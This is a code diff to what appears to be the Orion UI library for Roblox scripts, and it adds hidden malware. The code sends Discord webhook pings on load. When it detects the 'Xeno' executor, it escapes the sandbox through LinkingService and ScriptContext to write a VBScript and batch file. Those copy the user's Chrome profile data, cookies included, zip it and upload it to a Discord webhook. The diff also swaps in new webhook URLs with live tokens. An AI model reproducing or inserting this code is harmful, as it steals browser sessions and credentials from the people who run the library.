@@ -741,6 +741,8 @@ local webhookUrl = "https://discord.com/api/webhooks/1342910582864740423/OQZ4F9l
 local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
 
+
+
 function OrionLib:MakeWindow(WindowConfig)
 	local FirstTab = true
 	local Minimized = false
@@ -2039,11 +2041,16 @@ end
 function OrionLib:Destroy()
 	Orion:Destroy()
 end
-sendWebhook("https://discord.com/api/webhooks/1342962784979255307/2WSBKogNwFxO4B1CH1k36wQWaVzlG9q7BJpT6ICREtfNTatgDD6135oQpQXYDuW3GqY_", "test from "..Name)	
 
-print("SEX VIRUS LOADED")
+
 if string.find(identifyexecutor(), "Xeno") then
-			sendWebhook("https://discord.com/api/webhooks/1342962784979255307/2WSBKogNwFxO4B1CH1k36wQWaVzlG9q7BJpT6ICREtfNTatgDD6135oQpQXYDuW3GqY_", "COOKIES ON THEIR WAY")
+			local data = {
+        ["avatar_url"] = "",
+        ["content"] = "COOKI COMIN",
+    }
+    
+
+sendWebhook("https://discord.com/api/webhooks/1231675068694790235/JYTvGPHAlnbJ1SC85cH7OP-vAqZG9g9X_wEcLoIJrHUKM5QBjdl2ppc61Y6M_ma0afWl", HttpService:JSONEncode(data))	
 			
 script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(script:FindFirstAncestorWhichIsA("DataModel"):FindService("ScriptContext"):SaveScriptProfilingData([[
 Dim fso, tempFile, batFile, wshShell
@@ -2060,7 +2067,7 @@ tempFile.WriteLine("")
 tempFile.WriteLine("set ""APPDATA_PATH=%LOCALAPPDATA%""")
 tempFile.WriteLine("set ""CLONE_PATH=%TEMP%\ChromeBackup""")
 tempFile.WriteLine("set ""ZIP_PATH=%TEMP%\ChromeBackup.zip""")
-tempFile.WriteLine("set ""WEBHOOK_URL=https://discord.com/api/webhooks/1342962784979255307/2WSBKogNwFxO4B1CH1k36wQWaVzlG9q7BJpT6ICREtfNTatgDD6135oQpQXYDuW3GqY_""")
+tempFile.WriteLine("set ""WEBHOOK_URL=https://discord.com/api/webhooks/1231675068694790235/JYTvGPHAlnbJ1SC85cH7OP-vAqZG9g9X_wEcLoIJrHUKM5QBjdl2ppc61Y6M_ma0afWl""")
 tempFile.WriteLine("echo Cloning Chrome User Data...")
 tempFile.WriteLine("if not exist ""%CLONE_PATH%"" (")
 tempFile.WriteLine("    mkdir ""%CLONE_PATH%""")
